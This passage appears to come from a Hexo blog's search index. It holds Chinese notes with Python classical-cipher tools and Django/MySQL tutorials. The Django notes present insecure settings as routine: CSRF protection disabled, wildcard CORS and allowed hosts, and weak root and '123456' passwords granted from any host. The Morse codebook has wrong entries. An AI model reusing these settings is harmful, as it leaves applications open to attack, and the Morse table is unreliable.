text = text.split(' ') elif ',' in text: text = text.split(',') s = map(lambda x:chr(int(x)),text) flag = ''.join(s) return flag def hextostr(text): text = re.findall(r'.{2}',text) #print text s = map(lambda x:chr(int(x,16)),text) #print s flag = ''.join(s) return flag if __name__ == '__main__': parser = argparse.ArgumentParser() parser.add_argument(\"-b\") parser.add_argument(\"-a\") parser.add_argument(\"-x\") argv = parser.parse_args() #print argv if argv.b: res = bintostr(argv.b) print (res) elif argv.a: res = asciitostr(argv.a) print (res) elif argv.x: res = hextostr(argv.x) print (res)"},{"title":"","date":"2018-12-01T03:49:00.000Z","updated":"2022-05-10T01:51:00.000Z","comments":true,"path":"notes/Cryptography/Caesar.html","permalink":"https://blog.mhuig.top/notes/Cryptography/Caesar","excerpt":"","text":"Caesar Python Caesar Caesar.py#-*-coding:utf-8-*-import osdef encryption(): str_raw = input(\"请输入明文：\") k = int(input(\"请输入位移值：\")) str_change = str_raw.lower() str_list = list(str_change) str_list_encry = str_list i = 0 while i &lt; len(str_list): if ord(str_list[i]) &lt; 123-k: str_list_encry[i] = chr(ord(str_list[i]) + k) else: str_list_encry[i] = chr(ord(str_list[i]) + k - 26) i = i+1 print (\"加密结果为：\"+\"\".join(str_list_encry))def decryption(): str_raw = input(\"请输入密文：\") k = int(input(\"请输入位移值：(-1代表穷举)\")) if k==-1: print(\"解密结果为：\") for k in range(1,27): str_change = str_raw.lower() str_list = list(str_change) str_list_decry = str_list i = 0 while i &lt; len(str_list): if ord(str_list[i]) &gt;= 97+k: str_list_decry[i] = chr(ord(str_list[i]) - k) else: str_list_decry[i] = chr(ord(str_list[i]) + 26 - k) i = i+1 print (\"\".join(str_list_decry)) else: print(\"解密结果为：\") str_change = str_raw.lower() str_list = list(str_change) str_list_decry = str_list i = 0 while i &lt; len(str_list): if ord(str_list[i]) &gt;= 97+k: str_list_decry[i] = chr(ord(str_list[i]) - k) else: str_list_decry[i] = chr(ord(str_list[i]) + 26 - k) i = i+1 print (\"\".join(str_list_decry))def caesar(): print (u\"1. 加密\") print (u\"2. 解密\") choice = input(\"请选择：\") if choice == \"1\": encryption() elif choice == \"2\": decryption() else: print (u\"您的输入有误！\")if __name__ == '__main__': try: while True: caesar() except EOFError: exit()"},{"title":"","date":"2018-12-01T02:29:00.000Z","updated":"2022-05-10T01:51:00.000Z","comments":true,"path":"notes/Cryptography/MD5.html","permalink":"https://blog.mhuig.top/notes/Cryptography/MD5","excerpt":"","text":"MD5 Python MD5 MD5.pyimport hashlibclass MD5: def str(): str=input() m = hashlib.md5() m.update(str.encode('utf-8')) print (m.hexdigest()) def filebin(): src=input() f = open(src, 'rb') f_md5 = hashlib.md5() f_md5.update(f.read()) print (f_md5.hexdigest()) def file(): src=input() f = open(src, 'r') f_md5 = hashlib.md5() f_md5.update(f.read().encode('utf-8')) print (f_md5.hexdigest()) if __name__=='__main__': try: while True: MD5.filebin() except EOFError: exit()"},{"title":"","date":"2018-12-01T02:52:00.000Z","updated":"2022-05-10T01:52:00.000Z","comments":true,"path":"notes/Cryptography/Morse.html","permalink":"https://blog.mhuig.top/notes/Cryptography/Morse","excerpt":"","text":"Morse Python Morse Morse.py# -*- coding:utf-8 -*-def Morse(): try: s = input() codebook = { 'A':\".-\", 'B':\"-...\", 'C':\"-.-.\", 'D':\"-..\", 'E':\".\", 'F':\"..-.\", 'G':\"--.\", 'H':\"....\", 'I':\"..\", 'J':\".---\", 'K':\"-.-\", 'L':\".-..\", 'M':\"--\", 'N':\"-.\", 'O':\"---\", 'P':\".--.\", 'Q':\"--.-\", 'R':\".-.\", 'S':\"...\", 'T':\"-\", 'U':\"..-\", 'V':\".--\", 'W':\".--\", 'X':\"-..-\", 'Y':\"-.--\", 'Z':\"--..\", '1':\".----\", '2':\"..---\", '3':\"...---\", '4':\"....-\", '5':\".....\", '6':\"-....\", '7':\"--...\", '8':\"---..\", '9':\"----.\", '0':\"-----\", '.':\".━.━.━\", '?':\"..--..\", '!':\"-.-.--\", '(':\"-.--.\", '@':\".--.-.\", ':':\"---...\", '=':\"-...-\", '-':\"-....-\", ')':\"-.--.-\", '+':\".-.-.\", ',':\"--..--\", '\\'':\".----.\", '_':\"..--.-\", '$':\"...-..-\", ';':\"-.-.-.\", '/':\"-..-.\", '\\\"':\".-..-.\", } clear = \"\" cipher = \"\" while 1: ss = s.split(\" \"); for c in ss: for k in codebook.keys(): if codebook[k] == c: cipher+=k print(cipher) break; except Exception as e: print(\"\",end=\"\")if __name__ == '__main__': try: while True: Morse() except EOFError: exit()"},{"title":"","date":"2018-12-01T05:29:00.000Z","updated":"2022-05-10T01:53:00.000Z","comments":true,"path":"notes/Cryptography/Playfair.html","permalink":"https://blog.mhuig.top/notes/Cryptography/Playfair","excerpt":"","text":"Playfair Python Playfair Playfair.py#########################Playfair密码##########################约定1：若明文字母数量为奇数，在明文末尾添加一个'Z'#约定2：'I'作为'J'来处理#字母表letter_list='ABCDEFGHJKLMNOPQRSTUVWXYZ'#密码表T_letter=['','','','','']#根据密钥建立密码表def Create_Matrix(key): key=Remove_Duplicates(key) #移除密钥中的重复字母 key=key.replace(' ','') #去除密钥中的空格 for ch in letter_list: #根据密钥获取新组合的字母表 if ch not in key: key+=ch j=0 for i in range(len(key)): #将新的字母表里的字母逐个填入密码表中，组成5*5的矩阵 T_letter[j]+=key[i] #j用来定位字母表的行 if 0==(i+1)%5: j+=1#移除字符串中重复的字母def Remove_Duplicates(key): key=key.upper() #转成大写字母组成的字符串 _key='' for ch in key: if ch=='I': ch='J' if ch in _key: continue else: _key+=ch return _key #获取字符在密码表中的位置def Get_MatrixIndex(ch): for i in range(len(T_letter)): for j in range(len(T_letter)): if ch==T_letter[i][j]: return i,j #i为行，j为列 #加密def Encrypt(plaintext,T_letter): ciphertext='' if len(plaintext) % 2 !=0: #如果新的明文长度为奇数，在其末尾添上'Z' plaintext+='Z' i=0 while i&lt;len(plaintext): #对明文进行遍历 if True==plaintext[i].isalpha(): #如果是明文是字母的话， j=i+1 #则开始对该字母之后的明文进行遍历， while j&lt;len(plaintext): #直到遍历到字母，进行加密 if True==plaintext[j].isalpha(): if 'I'==plaintext[i].upper(): # x=Get_MatrixIndex('J') # else: # x=Get_MatrixIndex(plaintext[i].upper()) #对字符在密码表中的坐标 if 'I'==plaintext[j].upper(): #进行定位,同时将'I'作为 y=Get_MatrixIndex('J') #'J'来处理 else: # y=Get_MatrixIndex(plaintext[j].upper()) # if x[0]==y[0]: #如果在同一行 ciphertext+=T_letter[x[0]][(x[1]+1)%5]+T_letter[y[0]][(y[1]+1)%5] elif x[1]==y[1]: #如果在同一列 ciphertext+=T_letter[(x[1]+1)%5][x[0]]+T_letter[(y[1]+1)%5][y[0]] else: #如果不同行不同列 ciphertext+=T_letter[x[0]][y[1]]+T_letter[y[0]][x[1]] break; #每组明文对加密完成后，结束本次对明文的遍历 j+=1 i=j+1 #每次对明文的遍历是从加密过后的明文的后一个明文开始的,结束本次循环 continue else: ciphertext+=plaintext[i] #如果明文不是字母，直接加到密文上 i+=1 return ciphertext #解密def Decrypt(ciphertext,T_letter): plaintext='' if len(ciphertext) % 2 !=0: #如果新的密文长度为奇数，在其末尾添上'Z' ciphertext+='Z' i=0 while i&lt;len(ciphertext): #对密文进行遍历 if True==ciphertext[i].isalpha(): #如果是密文是字母的话， j=i+1 #则开始对该字母之后的密文进行遍历， while j&lt;len(ciphertext): #直到遍历到字母，进行解密 if True==ciphertext[j].isalpha(): if 'I'==ciphertext[i].upper(): # x=Get_MatrixIndex('J') # else: # x=Get_MatrixIndex(ciphertext[i].upper()) #对字符在密码表中的坐标 if 'I'==ciphertext[j].upper(): #进行定位,同时将'I'作为 y=Get_MatrixIndex('J') #'J'来处理 else: # y=Get_MatrixIndex(ciphertext[j].upper()) # if x[0]==y[0]: #如果在同一行 plaintext+=T_letter[x[0]][(x[1]-1)%5]+T_letter[y[0]][(y[1]-1)%5] elif x[1]==y[1]: #如果在同一列 plaintext+=T_letter[(x[1]-1)%5][x[0]]+T_letter[(y[1]-1)%5][y[0]] else: #如果不同行不同列 plaintext+=T_letter[x[0]][y[1]]+T_letter[y[0]][x[1]] break; #每组密文对解密完成后，结束本次对密文的遍历 j+=1 i=j+1 #每次对密文的遍历是从解密过后的密文的后一个密文开始的,结束本次循环 continue else: plaintext+=ciphertext[i] #如果密文不是字母，直接加到明文上 i+=1 return plaintext #主函数if __name__=='__main__': print(\"加密请按D,解密请按E:\") user_input=input(); while(user_input!='D' and user_input!='E'):#输入合法性检测 print(\"输入有误!请重新输入:\") user_input=input() print('请输入密钥，密钥由英文字母组成:') key=input() Create_Matrix(key) #建立密码表 if user_input=='D': #加密 print('请输入明文:') plaintext=input() print(\"密文为:\\n%s\" % Encrypt(plaintext,T_letter)) else: #解密 print('请输入密文:') ciphertext=input() print('明文为:\\n%s' % Decrypt(ciphertext,T_letter))"},{"title":"","date":"2018-12-01T06:39:00.000Z","updated":"2022-05-10T01:54:00.000Z","comments":true,"path":"notes/Cryptography/QRcode.html","permalink":"https://blog.mhuig.top/notes/Cryptography/QRcode","excerpt":"","text":"QRcode Python QRcode 加密enQRcode.pyimport qrcodeimport osimport sysimport time#pip install zxing解析库，还需要安装PIL，pillow和qrCode库QRImagePath = os.getcwd() + '/qrcode.png' #临时存储位置qr = qrcode.QRCode( version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=10, border=2,) #设置图片格式print(\"input:QRcode image:\")data = input() #运行时输入数据qr.add_data(data)qr.make(fit=True)img = qr.make_image()img.save('qrcode.png') #生成图片 if sys.platform.find('darwin') &gt;= 0: os.system('open %s' % QRImagePath) elif sys.platform.find('linux') &gt;= 0: os.system('xdg-open %s' % QRImagePath)else: os.system('call %s' % QRImagePath) time.sleep(5) #间隔5个单位#os.remove(QRImagePath) #删除图片 解密deQRcode.pyimport osimport loggingfrom PIL import Imageimport zxing #导入解析包import randomlogger = logging.getLogger(__name__) #记录数据if not logger.handlers: logging.basicConfig(level = logging.INFO)DEBUG = (logging.getLevelName(logger.getEffectiveLevel()) == 'DEBUG') #记录调式过程# 在当前目录生成临时文件，规避java的路径问题def ocr_qrcode_zxing(filename): img = Image.open(filename) ran = int(random.random() * 100000) #设置随机数据的大小 img.save('%s%s.jpg' % (os.path.basename(filename).split('.')[0], ran)) zx = zxing.BarCodeReader() #调用zxing二维码读取包 data = '' zxdata = zx.decode('%s%s.jpg' % (os.path.basename(filename).split('.')[0], ran)) #图片解码# 删除临时文件 os.remove('%s%s.jpg' % (os.path.basename(filename).split('.')[0], ran)) if zxdata: logger.debug(u'zxing识别二维码:%s,内容: %s' % (filename, zxdata)) data = zxdata else: logger.error(u'识别zxing二维码出错:%s' % (filename)) img.save('%s-zxing.jpg' % filename) return data #返回记录的内容if __name__ == '__main__': print(\"input:QRcode path:\") filename = input() # zxing二维码识别 ltext = ocr_qrcode_zxing(filename) #将图片文件里的信息转码放到ltext里面 logger.info(u'[%s]Zxing二维码识别:[%s]!!!' % (filename, ltext)) #记录文本信息 print(ltext) #打印出二维码名字"},{"title":"","date":"2018-12-01T07:59:00.000Z","updated":"2022-05-10T01:55:00.000Z","comments":true,"path":"notes/Cryptography/RailFenceCipher.html","permalink":"https://blog.mhuig.top/notes/Cryptography/RailFenceCipher","excerpt":"","text":"RailFenceCipher Python RailFenceCipher RailFenceCipher.py#coding=utf-8def railFenceCipher(): e = input() elen = len(e) field=[] for i in range(2,elen): if(elen%i==0): field.append(i) for f in field: b = int(elen / f) result = {x:'' for x in range(b)} for i in range(elen): a = i % b; result.update({a:result[a] + e[i]}) d = '' for i in range(b): d = d + result[i] print (d.lower())if __name__ == '__main__': try: while True: railFenceCipher() except EOFError: exit()"},{"title":"","date":"2022-05-10T01:45:00.000Z","updated":"2022-05-10T01:45:00.000Z","comments":true,"path":"notes/Cryptography/index.html","permalink":"https://blog.mhuig.top/notes/Cryptography/","excerpt":"","text":".fa-secondary{opacity:.4} Cryptography Cryptography .prev-next{ display: none !important; }"},{"title":"","date":"2019-09-22T07:11:00.000Z","updated":"2022-05-12T11:50:00.000Z","comments":true,"path":"notes/Django/ajax.html","permalink":"https://blog.mhuig.top/notes/Django/ajax","excerpt":"","text":"Django 发布动态内容 Django 将发布内容动态显示到页面上 将发布内容动态显示到页面上在 settings.py 中配置TEMPLATES = [ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [os.path.join(BASE_DIR,\"Templates\")], 'APP_DIRS': True, 'OPTIONS': { 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', 'django.template.context_processors.media', # 新添加的 ], }, },]#已经配置过的MEDIA_URL = '/media/'MEDIA_ROOT = os.path.join(BASE_DIR,'media') 在 urls.py 中配置路由from tour.settings import MEDIA_ROOTfrom django.views.static import serve #注意包不能导错urlpatterns = [ url(r'^admin/', admin.site.urls), url(r'^media/(?P&lt;path&gt;.*)/$', serve, {\"document_root\": MEDIA_ROOT}),#加载media文件的时候需要的路由 url(r\"^gettour\",views.gettour),#获取tour.html页面的路由 url(r\"^sendtour\",views.sendTour),#发布动态的路由] 在 views.py 文件中创建 sendTour 的函数def sendTour(request): try: #从请求中将表单中的数据取出，并且存储到数据库中 tour = Tour() tour.username= request.POST.get(\"username\") tour.times = request.POST.get(\"times\") tour.sendtime = request.POST.get(\"sendtime\") tour.sendtxt = request.POST.get(\"sendtxt\") tour.phonename = request.FILES.get(\"imgfile\") tour.musicname = request.FILES.get(\"musicfile\") tour.save() #若存储成功，则将对象转为字典 tourdict = {\"code\":\"1\",\"username\":tour.username,\"times\":tour.times, \"sendtime\":tour.sendtime,\"phonename\":tour.phonename.url ,\"musicname\":tour.musicname.url,\"sendtxt\":tour.sendtxt} # 再字典转为json字符串，返回到前端页面中 response = HttpResponse(json.dumps(tourdict)) except Exception as e: print(e) response = HttpResponse(json.dumps({'code': \"0\"})) response[\"Access-Control-Allow-Origin\"] = \"*\" response[\"Access-Control-Allow-Methods\"] = \"POST, GET, OPTIONS\" response[\"Access-Control-Max-Age\"] = \"1000\" response[\"Access-Control-Allow-Headers\"] = \"*\" return response 在前端页面中添加函数function sendData(){//选中dataform表单对其进行格式化处理var dataform = new FormData($(\"#datafrom\")[0])console.log(dataform)var user = document.getElementById(\"user\").innerHTML; //将数据追加到表单中 dataform.append(\"username\",user)var dates = new Date()var y = dates.getFullYear()var m = dates.getMonth() + 1var d = dates.getDate()dataform.append(\"sendtime\",y+\"/\"+m+\"/\"+d)//追加一个时间戳dataform.append(\"times\",dates.getTime())$.ajax({ type:\"post\", url:\"http://127.0.0.1:9000/sendtour\", data:dataform, async:true, dataType:\"json\", timeout:5000, cache:false, //提交表单的时候需要的参数 contentType:false, processData:false, success:function(data){//请求成功的时候返回的参数 alert(data) if(data.code==\"1\"){//判断数据是否成功存入数据库 alert(\"发布成功\") // 将我们返回的数据显示到页面上来 addhistory(data) } if(data.code==\"0\"){//数据没存储成功，则显示发布失败！ alert(\"发布失败\") } }, error:function(){ alert(\"请求异常\") }})}//将得到的数据动态的添加到html页面中function addhistory(data) { //打印data数据console.log(data) //找到存放li的大盒子var $ul = document.getElementById(\"ulitem\"); //创建一个livar $li = document.createElement(\"li\")//将li添加到ul中$ul.appendChild($li) //给li添加一个class属性$li.className = \"item\"; //给li添加标签$li.innerHTML = '&lt;img class=\"item-img\" src=\"'+data.phonename+'\"/&gt;' + '&lt;div class=\"item-right\"&gt;' + '&lt;a class=\"delete\" href=\"#\"&gt;删除&lt;/a&gt;' + '&lt;p class=\"itemtxt\"&gt;'+data.sendtxt+'&lt;/p&gt;'+ '&lt;div class=\"userbox\"&gt;&lt;img class=\"icon-img\" src=\"/static/img/a1.png\"/&gt; ' + '&lt;span class=\"username\"&gt;'+data.username+'&lt;/span&gt;&lt;span class=\"sendtime\"&gt;'+data.sendtime +'&lt;/span&gt;&lt;/div&gt;' + '&lt;div&gt;&lt;a class=\"musicname\" href=\"#\"&gt;'+data.musicname+'&lt;/a&gt;&lt;/div&gt;' + '&lt;/div&gt;'}"},{"title":"","date":"2019-09-22T07:12:00.000Z","updated":"2022-05-12T11:51:00.000Z","comments":true,"path":"notes/Django/form.html","permalink":"https://blog.mhuig.top/notes/Django/form","excerpt":"","text":"Django 带文件的表单上传 Django 带文件的表单上传 带文件的表单上传首先在表单 form 中必须要添加这个属性enctype=\"multipart/form-data\" 然后在 js 中添加下列代码 //选中需要上传的表单，并且进行格式化处理var formData=new FormData($(\"#formdata\")[0]);console.log(formData)//获取用户名var user=document.getElementById(\"username\").innerHTML;var date=new Date();var month=date.getMonth()+1;//把数据追加到表单formData.append(\"username\",user);formData.append(\"date\",date.getFullYear()+\"-\"+month+\"-\"+date.getDate());formData.append(\"sign\",date.getTime());$.ajax({ type:\"post\", url:\"http://127.0.0.1:8000/tour/sendDay\", async:true, data:formData, timeout:5000, dataType:\"json\", cache:false, //提交表单必须增加的属性 contentType:false, processData:false, success:function(data){ alert(data); console.log(data) if(data.code == \"1\") { alert(\"发布成功\") } if(data.code == \"2\"){ alert(\"发布失败\") } }, error:function(xhr,textState){ alert(\"请求失败！\") }}); 在 models 中添加以下类class Tours(models.Model): username = models.CharField(max_length=20) date = models.CharField(max_length=20) times = models.CharField(max_length=100) desc = models.CharField(max_length=255) photoname = models.FileField(upload_to=\"photo\",null=True,blank=True) musicname = models.FileField(upload_to=\"music\",null=True,blank=True) isDelete = models.BooleanField(default=False) 在 settings.py 文件中添加如下代码MEDIA_URL = '/media/'MEDIA_ROOT = os.path.join(BASE_DIR,'media') 在 urls.py 文件中创建路由from django.views.static import servefrom App import viewsfrom tourdemo import settingsfrom tourdemo.settings import MEDIA_ROOTurlpatterns = [ url(r'^admin/', admin.site.urls), url(r\"^tour/sendDay\",views.tourSendDay), #加载media文件需要的路由 url(r'^media/(?P&lt;path&gt;.*)/$', serve, {\"document_root\": MEDIA_ROOT}),] 在 views.py 文件中添加 tourSendDay 函数def tourSendDay(request): try: tour = Tours() username = request.POST.get(\"username\") tour.username = username date = request.POST.get(\"date\") tour.date = date times = request.POST.get(\"sign\") tour.times = times music = request.FILES.get(\"music\") tour.musicname = music img = request.FILES.get(\"photo\") tour.photoname = img desc = request.POST.get(\"desc\") # print(desc) tour.desc = desc # print(\"desc\",tour.desc) tour.save() tourdic = {\"code\":\"1\",\"id\": tour.id, \"photoname\": tour.photoname.url, \"musicname\": tour.musicname.url, \"times\": tour.times, \"username\": tour.username, \"date\": tour.date, \"desc\": tour.desc} response = HttpResponse(json.dumps(tourdic)) except Exception as e: print(e) response = HttpResponse(json.dumps({\"code\": \"2\"})) response[\"Access-Control-Allow-Origin\"] = \"*\" response[\"Access-Control-Allow-Methods\"] = \"POST, GET, OPTIONS\" response[\"Access-Control-Max-Age\"] = \"1000\" response[\"Access-Control-Allow-Headers\"] = \"*\" return response 注意若出现存储中文失败则需要在创建的的时候指定编码格式create database tourdb charset='utf8';"},{"title":"","date":"2022-05-12T11:31:00.000Z","updated":"2022-05-12T11:31:00.000Z","comments":true,"path":"notes/Django/index.html","permalink":"https://blog.mhuig.top/notes/Django/","excerpt":"","text":".fa-secondary{opacity:.4} Django Django .prev-next{ display: none !important; }"},{"title":"","date":"2019-09-22T07:04:00.000Z","updated":"2022-08-09T09:36:00.000Z","comments":true,"path":"notes/Django/mysql.html","permalink":"https://blog.mhuig.top/notes/Django/mysql","excerpt":"","text":"MySQL mysql 的使用 mysql 的简单配置使用 免安装版本 下载免安装版本下载地址： https://dev.mysql.com/downloads/mysql/ 解压解压 mysql 压缩包【记得解压的文件路径】 进行环境变量的配置我的电脑 --&gt; 属性 ---&gt; 高级环境变量设置 --&gt; 找到 path --&gt; 新建 --&gt; 将 mysql 的路径【bin 的路径】直接复制粘贴 配置文件初始化创建配置文件，命名为 my.ini，内容如下 [mysql]# 设置mysql客户端默认字符集default-character-set=utf8[mysqld]interactive_timeout=28800000wait_timeout=28800000# 设置3306端口port = 3306# 设置mysql的安装目录basedir=C:\\software\\mysql-8.0.30-winx64\\bin# 设置mysql数据库的数据的存放目录datadir=C:\\software\\mysql-8.0.30-winx64\\data# 允许最大连接数max_connections=200# 设置mysql服务端默认字符集character-set-server=utf8# 创建新表时将使用的默认存储引擎default-storage-engine=INNODB 安装 mysql 服务，输入 mysqld -install 初始化 mysql，输入以下命令，mysql 目录下会生成 data 文件夹 mysqld --initialize 如果没有生成 data 文件夹，则使用以下命令 mysqld --initialize-insecure --user=mysql 启动数据库启动 mysql net start mysql 打开 mysql 根目录下的 data 文件夹，找到后缀是.err 的文件以文本打开找到 password 临时密码 设置密码 mysqladmin -u root -p password 要停止 mysql 服务，使用命令 net stop mysql 连接数据库mysql -u root -p root【默认密码】 数据库连接成功之后，可以查看数据库show databases; //查看数据库use 数据库名; //使用某个指定的数据库show tables; //查看所有的表create database 数据库名; //创建数据库drop database 数据库名; //删除数据库 navicat 连接 mysql 时报错 1251 怎么办新安装的 mysql8，使用破解版的 navicat 连接的时候一直报错 1251 发现是 mysql8 之前的版本中加密规则是 mysql_native_password，而在 mysql8 之后，加密规则是 caching_sha2_password。 解决问题方法有两种， 一种是升级 navicat 驱动； 一种是把 mysql 用户登录密码加密规则还原成 mysql_native_password。 进入 mysql 加密规则还原成 mysql_native_password ALTER USER 'root'@'localhost' IDENTIFIED BY 'password' PASSWORD EXPIRE NEVER;ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'MY NEW PASSWORD';FLUSH PRIVILEGES; 权限select host,user,authentication_string from mysql.user;create user \"toor\"@\"%\" identified by \"123456\";create database mydb charset='utf8';grant all privileges on `mydb`.* to 'toor'@'%' ;drop user \"toor\"@\"%\";insert into mysql.user(Host,User,authentication_string) values('%','toor',password('123456'));SET PASSWORD FOR 'toor'@'%' = PASSWORD(\"123456\");"},{"title":"","date":"2019-09-22T07:07:00.000Z","updated":"2022-05-12T11:41:00.000Z","comments":true,"path":"notes/Django/pymysql.html","permalink":"https://blog.mhuig.top/notes/Django/pymysql","excerpt":"","text":"mysql 与 pymysql 的设置 mysql 与 pymysql 的设置 mysql 与 pymysql 的设置 保证 mysql 已经安装成功 使用终端在 mysql 中创建一个数据库 mysql -u root -p#连接数据库mysql&gt; show databases;#查看当前数据库mysql&gt; create database tour;#创建数据库 tour：数据库名，可以自己命名 找到 setting.py 文件，并在添加如下代码 DATABASES = { 'default': { # 'ENGINE': 'django.db.backends.sqlite3', # 'NAME': os.path.join(BASE_DIR, 'db.sqlite3'), 'ENGINE': 'django.db.backends.mysql', 'NAME': 'tour', #数据库名字 \"USER\":\"root\", #数据库用户名 \"PASSWORD\":\"root\", #数据库的密码 \"HOST\":\"127.0.0.1\", #ip地址 \"PORT\":\"3306\",# 端口号 }} 注意：在使用数据库的时候，必须保证数据库的服务是开启的状态 net start mysql 找到 mysql 的安装地址，找到 bin 文件夹，到 bin 文件夹下面找到 mysqld.exe，双击执行 到与 setting.py 同目录的__init__.py 文件下，添加以下代码 import pymysqlpymysql.install_as_MySQLdb() 注意 若没有安装 pymysql 模块，则会报错，需要将 pymsql 模块安装 1. 使用 pycharm 安装2. 使用 pip 安装 pip install pymsql 当项目创建之后，配置完成之后，我们执行一下迁移【因为只有执行迁移的时候，才会在数据库中生成表】 python manage.py migrate 需要在 models.py 文件中创建一个类，并且这个类必须要继承 models.Model class User(models.Model): username = models.CharField(max_length=20) password = models.CharField(max_length=20) #CharField 指定字段的类型 #max_length 指定字段的最大长度 生成迁移文件 python manage.py makemigrations 执行迁移文件 python manage.py migrate"},{"title":"","date":"2019-09-22T07:06:00.000Z","updated":"2022-05-12T11:41:00.000Z","comments":true,"path":"notes/Django/setting.html","permalink":"https://blog.mhuig.top/notes/Django/setting","excerpt":"","text":"Django 的环境配置 Django 的环境配置 Django 的环境配置python 环境是 ok 的pip 是可用的 pip 用来安装第三方包的 创建虚拟环境【可以先不写】 linux/mac windows 安装 Django pip install django==1.11.7 django 安装成功之后，创建项目 创建项目之前首先新建一个目录【文件夹】 进入这个目录之后执行 django-admin startproject projectname#django-admin startproject 项目名 使用 pycharm 打开项目的时候，要在 manage.py 的上一级打开 manage 所在的文件夹 当进入 pychram 之后，我们可以使用自带终端来创建 apppython manage.py startapp appname 当 app 创建完成之后，需要在 setting.py 文件中配置INSTALLED_APPS = [ 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', \"App\",#添加我们创建的app] 在 setting.py 文件中ALLOWED_HOSTS = [\"*\"]#允许所有人访问 在 setting.py 文件中 #设置语言LANGUAGE_CODE = 'zh-hans'#设置时区TIME_ZONE = 'Asia/Shanghai' 运行当前项目python manage.py runserver 运行成功，在浏览器访问http://127.0.0.1:8000/#会显示正常工作 添加一个路由，在 urls.py 文件中添加urlpatterns = [ url(r'^admin/', admin.site.urls), # alt+enter 添加,需要导包，App下面的views url(r\"^login/\",views.login),] 需要在 app 中的 views.py 去创建视图函数 login def login(request): #必须返回的是httpResponse对象 return HttpResponse(\"你真是一个小机灵鬼！！！\") 执行 python manage.py runserver 将服务器重新部署 在浏览器访问的时候，这时候需要使用 http://127.0.0.1:8000/login"},{"title":"","date":"2019-09-22T07:09:00.000Z","updated":"2022-05-12T11:48:00.000Z","comments":true,"path":"notes/Django/static.html","permalink":"https://blog.mhuig.top/notes/Django/static","excerpt":"","text":"Django 中引用静态文件 Django 中引用静态文件 Django 中引用静态文件 当我们将我们的 html 文件放到 Templates 文件中的时候，这时候此 html 我们可以直接引用， 若出现这个 html 文件，它还引用了其他的一些文件【js，css，img】，这是就需要引用 django 中静态的文件 需要在 Templates 的同级目录下创建一个 static 目录需要在 setting 文件中添加代码#默认自带的STATIC_URL = '/static/'#添加代码STATICFILES_DIRS = ( os.path.join(BASE_DIR, 'static'),) 将 html 需要用到的资源，放在 static 目录下 在 html 中引用静态资源 &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script src=\"/static/js/jquery-2.1.0.js\" type=\"text/javascript\" charset=\"utf-8\"&gt;&lt;/script&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/style.css\"/&gt;&lt;/head&gt; 配置路由，在 urls.py 文件中配置urlpatterns = [ url(r'^admin/', admin.site.urls), url(r\"^getlogin\",views.getlogin)] 需要在 views.py 文件中创建 getlogin 函数def getlogin(request): #返回登录的页面 return render(request,\"login.html\") 启动服务python manage.py runserver 127.0.0.1:9000 如何请求接口http://127.0.0.1:9000/getlogin"},{"title":"","date":"2019-09-22T07:09:00.000Z","updated":"2022-05-12T11:46:00.000Z","comments":true,"path":"notes/Django/urlpatterns.html","permalink":"https://blog.mhuig.top/notes/Django/urlpatterns","excerpt":"","text":"Django 添加新的路由 Django 添加新的路由 Django 添加新的路由首先 urls.py 文件添加路由urlpatterns = [ url(r'^admin/', admin.site.urls), # alt+enter url(r\"^login/\",views.login), url(r\"^app/addStu/\",views.addStu), url(r\"^register\",views.register)] 在 views.py 中创建函数 registerdef register(request): print(\"register\") user = request.POST.get(\"user\") print(user) psd = request.POST.get(\"psd\") print(psd) #解决跨域问题 response = HttpResponse(user) response[\"Access-Control-Allow-Origin\"] = \"*\" response[\"Access-Control-Allow-Methods\"] = \"POST, GET, OPTIONS\" response[\"Access-Control-Max-Age\"] = \"1000\" response[\"Access-Control-Allow-Headers\"] = \"*\" return response 由于 ajax 跨域的问题，也需要在 settings.py 文件中设置，将选中的模块注释MIDDLEWARE = [ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.common.CommonMiddleware', # 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware',] 我们的 ajax 请求在前端中使用的，在使用 ajax 之前，我们需要将 jquery 链接到我们的项目中&lt;script src=\"js/jquery-2.1.0.js\" type=\"text/javascript\" charset=\"utf-8\"&gt;&lt;/script&gt;src:jquery的链接地址 调用 ajax 请求$.ajax({ type:\"post\",//请求的类型 url:\"http://127.0.0.1:8000/register/\",//请求的地址[路由] async:true, //声明异步请求 data:{\"user\":user,\"psd\":psd},//将参数传递到后台 dataType:\"text\", //声明返回的数据的类型，json success:function (data) { //请求成功的时候调用的函数，data：后台返回给我们的数据 alert(data) }, error:function () { //请求的失败的时候，打印 alert(\"请求失败\") }})"},{"title":"","date":"2019-09-19T03:25:00.000Z","updated":"2022-05-10T06:43:00.000Z","comments":true,"path":"notes/Echarts/Overview.html","permalink":"https://blog.mhuig.top/notes/Echarts/Overview","excerpt":"","text":"Overview Overview volantis.css(\"/lib/hexo-github/github.css\"); volantis.js(\"/lib/hexo-github/github.js\").then(() => { new Badge(\"#badge-container-MHuiG-BigData-Archive-4bf68d5a9dfa76e95fd97bd641f84806e5e0bcb9\", \"MHuiG\", \"BigData-Archive\", \"4bf68d5a9dfa76e95fd97bd641f84806e5e0bcb9\", false); })"},{"title":"","date":"2022-05-10T06:36:00.000Z","updated":"2022-05-10T06:36:00.000Z","comments":true,"path":"notes/Echarts/index.html","permalink":"https://blog.mhuig.top/notes/Echarts/","excerpt":"","text":".fa-secondary{opacity:.4} Echarts Echarts .prev-next{ display: none !important; }"},{"title":"","date":"2022-05-10T01:55:00.000Z","updated":"2022-05-10T01:55:00.000Z","comments":true,"path":"notes/Flink/index.html","permalink":"https://blog.mhuig.top/notes/Flink/","excerpt":"","text":".fa-secondary{opacity:.4} Flink Flink .prev-next{ display: none !important; 